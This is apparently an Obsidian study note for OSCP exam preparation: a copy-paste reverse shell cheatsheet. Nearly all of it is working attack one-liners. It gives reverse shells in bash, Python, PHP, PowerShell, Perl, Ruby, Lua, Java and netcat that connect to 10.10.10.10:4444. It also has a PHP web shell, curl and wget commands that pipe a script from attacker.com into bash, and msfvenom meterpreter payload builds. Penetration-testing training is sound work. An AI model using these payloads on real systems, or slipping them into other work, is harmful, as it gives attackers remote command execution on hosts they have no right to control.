---
tags: [oscp, tools, shells, reverse-shell]
aliases: [Shell Reference, Payload Cheatsheet]
category: Tools
difficulty: ★★☆☆☆
last-updated: 2025-04-30
---

# 🐚 Reverse Shell Cheatsheet

> [!info] Copy-Paste Ready
> All shells in one place. Open during exam.

---

## Listener Setup

```bash
nc -lvnp 4444
rlwrap nc -lvnp 4444  # Better: history + line editing
```

---

## Bash

```bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
exec 1<>/dev/tcp/10.10.10.10/4444;exec 0<&1;/bin/bash -i 2>&1
```

---

## Python

```python
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'

python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'
```

---

## PHP

```php
<?php system($_REQUEST['cmd']); ?>

php -r '$sock=fsockopen("10.10.10.10",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
```

---

## PowerShell

```powershell
$ip="10.10.10.10";$port=4444;$c=New-Object Net.Sockets.TCPClient('10.10.10.10',$port);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$s.Write(([Text.Encoding]::ASCII).GetBytes($o),0,$o.Length)}$c.Close()
```

---

## Perl

```perl
perl -e 'use Socket;$i="10.10.10.10";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");}; '
```

---

## Ruby

```ruby
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.10.10.10","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

---

## Lua

```lua
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.10.10.10','4444');os.execute('/bin/sh -i <&3 >&3 2>&3')"
```

---

## Java

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","bash -i >& /dev/tcp/10.10.10.10/4444 0>&1"] as String[])
p.waitFor()
```

---

## cURL

```bash
curl http://attacker.com/shell.sh | bash
wget http://attacker.com/shell.sh -O- | bash
```

---

## Netcat

```bash
nc -e /bin/bash 10.10.10.10 4444
```

---

## MSFvenom Linux

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
```

---

## MSFvenom Windows

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o shell.exe
```

---

## Shell Upgrade

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

---

**Related Notes:**
- [[02-Linux/Shells-and-Payloads|💀 Shells & Payloads]]
- [[05-Tools/MSFvenom-Payloads|💣 MSFvenom Payloads]]

---
